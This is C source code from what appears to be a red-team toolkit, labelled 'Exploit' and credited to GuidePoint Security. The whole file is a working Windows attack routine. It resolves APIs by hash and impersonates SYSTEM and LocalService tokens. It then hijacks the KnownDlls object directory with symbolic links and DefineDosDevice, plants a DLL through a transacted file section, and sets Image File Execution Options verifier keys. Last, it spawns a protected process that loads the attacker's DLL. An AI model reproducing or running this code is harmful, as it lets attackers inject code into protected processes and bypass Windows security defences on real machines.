/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

NTSTATUS
NTAPI
NtCreateTransaction(
	_Out_ PHANDLE TransactionHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ LPGUID Wow,
	_In_opt_ HANDLE TmHandle,
	_In_opt_ ULONG CreateOptions,
	_In_opt_ ULONG IsolationLevel,
	_In_opt_ ULONG IsolationFlags,
	_In_opt_ PLARGE_INTEGER Timeout,
	_In_opt_ PUNICODE_STRING Description
);

typedef struct
{
	D_API( InitializeSecurityDescriptor );
	D_API( NtCreateSymbolicLinkObject );
	D_API( SetSecurityDescriptorDacl );
	D_API( CreateProcessWithTokenW );
	D_API( NtCreateDirectoryObject );
	D_API( SetKernelObjectSecurity );
	D_API( CreateFileTransactedW );
	D_API( RtlInitUnicodeString );
	D_API( NtCreateTransaction );
	D_API( NtFreeVirtualMemory );
	D_API( WaitForSingleObject );
	D_API( OutputDebugStringW );
	D_API( DuplicateTokenEx );
	D_API( DefineDosDeviceW );
	D_API( RegCreateKeyExW );
	D_API( NtCreateSection );
	D_API( RegSetValueExW );
	D_API( SetThreadToken );
	D_API( NtCreateEvent );
	D_API( RegDeleteKeyW );
	D_API( LdrUnloadDll );
	D_API( LdrLoadDll );
	D_API( WriteFile );
	D_API( NtClose );
} API ;

#define H_API_INITIALIZESECURITYDESCRIPTOR	0x31e175ce /* InitializeSecurityDescriptor */
#define H_API_NTCREATESYMBOLICLINKOBJECT	0xfbada4a2 /* NtCreateSymbolicLinkObject */
#define H_API_SETSECURITYDESCRIPTORDACL		0x5c048f5c /* SetSecurityDescriptorDacl */
#define H_API_CREATEPROCESSWITHTOKENW           0xf3e5480c /* CreateProcessWithTokenW */
#define H_API_NTCREATEDIRECTORYOBJECT		0x42144d27 /* NtCreateDirectoryObject */
#define H_API_SETKERNELOBJECTSECURITY		0xf543d2a1 /* SetKernelObjectSecurity */
#define H_API_CREATEFILETRANSACTEDW		0x0e864b59 /* CreateFileTransactedW */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_NTCREATETRANSACTION		0x06e54201 /* NtCreateTransaction */
#define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */
#define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
#define H_API_OUTPUTDEBUGSTRINGW		0x490fc1eb /* OutputDebugStringW */
#define H_API_DUPLICATETOKENEX			0x10ad057e /* DuplicateTokenEx */
#define H_API_DEFINEDOSDEVICEW			0x682dda9d /* DefineDosDeviceW */
#define H_API_REGCREATEKEYEXW			0x0c988e74 /* RegCreateKeyExW */
#define H_API_NTCREATESECTION			0xb80f7b50 /* NtCreateSection */
#define H_API_REGSETVALUEEXW			0x2cea05e0 /* RegSetValueExW */
#define H_API_SETTHREADTOKEN			0xc9f4966a /* SetThreadToken */
#define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
#define H_API_REGDELETEKEYW			0x2c0da6d6 /* RegDeleteKeyW */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_API_WRITEFILE				0xf1d207d0 /* WriteFile */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Spawns a protected process and forces it
 * to load a DLL before initializing using
 * application verifiers.
 *
!*/

D_SEC( C ) BOOL SpawnProtectedProcessLibrary( _In_ PVOID Image, _In_ SIZE_T Len, LPPROCESS_INFORMATION ProcIn ) 
{
	API			Api;
	STARTUPINFOA		Sta;
	UNICODE_STRING		Un1;
	UNICODE_STRING		Un2;
	OBJECT_ATTRIBUTES	Att;
	SECURITY_DESCRIPTOR	Des;

	LPWSTR			EvtStr = NULL;
	LPWSTR			LnkStr = NULL;
	LPWSTR			DskStr = NULL;
	LPWSTR			RegStr = NULL;
	LPWSTR			GblStr = NULL;
	LPWSTR			ObjStr = NULL;
	LPWSTR			KwnStr = NULL;

	BOOL			bRt = FALSE;
	DWORD			Flg = 0x100;

	HKEY			Reg = NULL;
	HANDLE			Evt = NULL;
	HANDLE			Dup = NULL;
	HANDLE			Sec = NULL;
	HANDLE			Fle = NULL;
	HANDLE			Mgr = NULL;
	HANDLE			Lk1 = NULL;
	HANDLE			Lk2 = NULL;
	HANDLE			Dir = NULL;
	HANDLE			Sys = NULL;
	HANDLE			Lcl = NULL;
	HMODULE			K32 = NULL;
	HMODULE			Adv = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sta, sizeof( Sta ) );
	RtlSecureZeroMemory( &Un1, sizeof( Un1 ) );
	RtlSecureZeroMemory( &Un2, sizeof( Un2 ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Des, sizeof( Des ) );

	Api.NtCreateSymbolicLinkObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATESYMBOLICLINKOBJECT );
	Api.NtCreateDirectoryObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEDIRECTORYOBJECT );
	Api.RtlInitUnicodeString       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtCreateTransaction        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETRANSACTION );
	Api.NtFreeVirtualMemory        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
	Api.NtCreateSection            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATESECTION );
	Api.NtCreateEvent              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.LdrLoadDll                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtClose                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Api.RtlInitUnicodeString( &Un1, C_PTR( G_PTR( L"kernel32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Un1, &K32 );

	Api.RtlInitUnicodeString( &Un1, C_PTR( G_PTR( L"advapi32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Un1, &Adv );

	if ( Adv != NULL && K32 != NULL ) {
		Api.InitializeSecurityDescriptor = PeGetFuncEat( Adv, H_API_INITIALIZESECURITYDESCRIPTOR );
		Api.SetSecurityDescriptorDacl    = PeGetFuncEat( Adv, H_API_SETSECURITYDESCRIPTORDACL );
		Api.CreateProcessWithTokenW      = PeGetFuncEat( Adv, H_API_CREATEPROCESSWITHTOKENW );
		Api.SetKernelObjectSecurity      = PeGetFuncEat( Adv, H_API_SETKERNELOBJECTSECURITY ); 
		Api.CreateFileTransactedW        = PeGetFuncEat( K32, H_API_CREATEFILETRANSACTEDW );
		Api.WaitForSingleObject          = PeGetFuncEat( K32, H_API_WAITFORSINGLEOBJECT );
		Api.OutputDebugStringW           = PeGetFuncEat( K32, H_API_OUTPUTDEBUGSTRINGW );
		Api.DuplicateTokenEx             = PeGetFuncEat( Adv, H_API_DUPLICATETOKENEX );
		Api.DefineDosDeviceW             = PeGetFuncEat( K32, H_API_DEFINEDOSDEVICEW );
		Api.RegCreateKeyExW              = PeGetFuncEat( Adv, H_API_REGCREATEKEYEXW );
		Api.RegSetValueExW               = PeGetFuncEat( Adv, H_API_REGSETVALUEEXW );
		Api.SetThreadToken               = PeGetFuncEat( Adv, H_API_SETTHREADTOKEN );
		Api.RegDeleteKeyW                = PeGetFuncEat( Adv, H_API_REGDELETEKEYW );
		Api.WriteFile                    = PeGetFuncEat( K32, H_API_WRITEFILE );

		Sys = TokenGetTokenWithSidAndPrivilegeCount( C_PTR( G_PTR( "S-1-5-18" ) ), 0x16 );
		Lcl = TokenGetTokenWithSidAndPrivilegeCount( C_PTR( G_PTR( "S-1-5-19" ) ), 0x00 );

		if ( Sys != NULL && Lcl != NULL ) {
			RandomStringW( C_PTR( G_PTR( LibSz ) ), 12 );
			RandomStringW( C_PTR( G_PTR( LnkSz ) ), 12 );
			RandomStringW( C_PTR( G_PTR( EvtSz ) ), 12 );

			EvtStr = StringPrintfAToW( C_PTR( G_PTR( "\\GLOBAL??\\%ls" ) ), C_PTR( G_PTR( EvtSz ) ) );
			KwnStr = StringPrintfAToW( C_PTR( G_PTR( "\\GLOBAL??\\KnownDlls\\%ls" ) ), C_PTR( G_PTR( LibSz ) ) );
			LnkStr = StringPrintfAToW( C_PTR( G_PTR( "\\GLOBAL??\\KnownDlls\\%ls" ) ), C_PTR( G_PTR( LnkSz ) ) );
			GblStr = StringPrintfAToW( C_PTR( G_PTR( "GLOBALROOT\\KnownDlls\\%ls" ) ), C_PTR( G_PTR( LibSz ) ) );
			ObjStr = StringPrintfAToW( C_PTR( G_PTR( "\\KernelObjects\\%ls" ) ), C_PTR( G_PTR( LibSz ) ) );
			DskStr = StringPrintfAToW( C_PTR( G_PTR( "C:\\Windows\\System32\\%ls" ) ), C_PTR( G_PTR( LibSz ) ) );
			RegStr = StringPrintfAToW( C_PTR( G_PTR( "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls" ) ), C_PTR( G_PTR( PrcSz ) ) );

			if ( Api.SetThreadToken( NULL, Sys ) ) {
				Api.RtlInitUnicodeString( &Un1, C_PTR( G_PTR( L"\\GLOBAL??\\KnownDlls" ) ) );
				InitializeObjectAttributes( &Att, &Un1, OBJ_CASE_INSENSITIVE, NULL, NULL );

				if ( ! NT_SUCCESS( Api.NtCreateDirectoryObject( &Dir, DIRECTORY_ALL_ACCESS, &Att ) ) ) {
					goto Leave;
				};

				Api.RtlInitUnicodeString( &Un1, KwnStr );
				Api.RtlInitUnicodeString( &Un2, LnkStr );
				InitializeObjectAttributes( &Att, &Un1, OBJ_CASE_INSENSITIVE, NULL, NULL );

				if ( ! NT_SUCCESS( Api.NtCreateSymbolicLinkObject( &Lk1, SYMBOLIC_LINK_ALL_ACCESS, &Att, &Un2 ) ) ) {
					goto Leave;
				};
				if ( ! Api.InitializeSecurityDescriptor( &Des, SECURITY_DESCRIPTOR_REVISION ) ) {
					goto Leave;
				};
				if ( ! Api.SetSecurityDescriptorDacl( &Des, TRUE, NULL, FALSE ) ) {
					goto Leave;
				};
				if ( ! Api.SetKernelObjectSecurity( Lk1, DACL_SECURITY_INFORMATION, &Des ) ) {
					goto Leave;
				};

				if ( Api.SetThreadToken( NULL, Lcl ) ) {
					Api.RtlInitUnicodeString( &Un1, C_PTR( G_PTR( L"\\??\\GLOBALROOT" ) ) );
					Api.RtlInitUnicodeString( &Un2, C_PTR( G_PTR( L"\\GLOBAL??" ) ) );

					if ( ! NT_SUCCESS( Api.NtCreateSymbolicLinkObject( &Lk2, SYMBOLIC_LINK_ALL_ACCESS, &Att, &Un2 ) ) ) {
						goto Leave;
					};
					if ( ! Api.DefineDosDeviceW( DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, GblStr, ObjStr ) ) {
						goto Leave;
					};

					if ( Api.SetThreadToken( NULL, Sys ) ) {
						InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );
						if ( ! NT_SUCCESS( Api.NtCreateTransaction( &Mgr, TRANSACTION_ALL_ACCESS, &Att, NULL, NULL, 0, 0, 0, NULL, NULL ) ) ) {
							goto Leave;
						};
						if ( ( Fle = Api.CreateFileTransactedW( DskStr, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL, Mgr, NULL, NULL ) ) == INVALID_HANDLE_VALUE ) {
							goto Leave;
						};
						if ( ! Api.WriteFile( Fle, Image, Len, &( DWORD ){ 0x0 }, NULL ) ) {
							goto Leave;
						};

						Api.RtlInitUnicodeString( &Un1, ObjStr );
						InitializeObjectAttributes( &Att, &Un1, OBJ_CASE_INSENSITIVE, NULL, NULL );

						if ( NT_SUCCESS( Api.NtCreateSection( &Sec, SECTION_ALL_ACCESS, &Att, NULL, PAGE_READONLY, SEC_IMAGE, Fle ) ) ) {
							if ( Api.RegCreateKeyExW( HKEY_LOCAL_MACHINE, RegStr, 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &Reg, &( DWORD ){ 0x0 } ) != ERROR_SUCCESS ) {
								goto Leave;
							};
							if ( Api.RegSetValueExW( Reg, C_PTR( G_PTR( L"VerifierDlls" ) ), 0, REG_SZ, C_PTR( G_PTR( LibSz ) ), 34 ) != ERROR_SUCCESS ) {
								goto Leave;
							};
							if ( Api.RegSetValueExW( Reg, C_PTR( G_PTR( L"GlobalFlag" ) ), 0, REG_DWORD, &Flg, 4 ) != ERROR_SUCCESS ) {
								goto Leave;
							};
							if ( Api.DuplicateTokenEx( Sys, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &Dup ) ) {
								Api.RtlInitUnicodeString( &Un1, EvtStr );
								InitializeObjectAttributes( &Att, &Un1, OBJ_CASE_INSENSITIVE, NULL, NULL );

								if ( NT_SUCCESS( Api.NtCreateEvent( &Evt, EVENT_ALL_ACCESS, &Att, SynchronizationEvent, FALSE ) ) ) {
									Sta.cb = sizeof( Sta );

									if ( Api.CreateProcessWithTokenW( Dup, 0, NULL, C_PTR( G_PTR( PrcSz ) ), CREATE_PROTECTED_PROCESS, NULL, NULL, &Sta, ProcIn ) ) 
									{
										if ( Api.WaitForSingleObject( Evt, 5000 ) == WAIT_OBJECT_0 ) 
										{
											bRt = TRUE;
										} else {
											Api.NtClose( ProcIn->hProcess );
											Api.NtClose( ProcIn->hThread );
											RtlSecureZeroMemory( ProcIn, sizeof( PROCESS_INFORMATION ) );
										};
									};
								};
							}
						};
					};
				};
			};
		};
		Api.SetThreadToken( NULL, NULL );
	};
Leave:
	if ( Evt != NULL ) {
		Api.NtClose( Evt );
	};
	if ( Dup != NULL ) {
		Api.NtClose( Dup );
	};
	if ( Reg != NULL ) {
		Api.RegDeleteKeyW( HKEY_LOCAL_MACHINE, RegStr );
		Api.NtClose( Reg );
	};
	if ( Sec != NULL ) {
		Api.NtClose( Sec );
	};
	if ( Fle != NULL ) {
		Api.NtClose( Fle );
	};
	if ( Mgr != NULL ) {
		Api.NtClose( Mgr );
	};
	if ( Lk2 != NULL ) {
		Api.NtClose( Lk2 );
	};
	if ( Lk1 != NULL ) {
		Api.NtClose( Lk1 );
	};
	if ( Dir != NULL ) {
		Api.NtClose( Dir );
	};
	if ( EvtStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &EvtStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( RegStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &RegStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( DskStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &DskStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( ObjStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &ObjStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( GblStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &GblStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( LnkStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &LnkStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( KwnStr != NULL ) {
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &KwnStr, &( SIZE_T ){ 0x0 }, MEM_RELEASE );
	};
	if ( Sys != NULL ) {
		Api.NtClose( Sys );
	};
	if ( Lcl != NULL ) {
		Api.NtClose( Lcl );
	};
	if ( Adv != NULL ) {
		Api.LdrUnloadDll( Adv );
	};
	if ( K32 != NULL ) {
		Api.LdrUnloadDll( K32 );
	};
	return bRt;
};
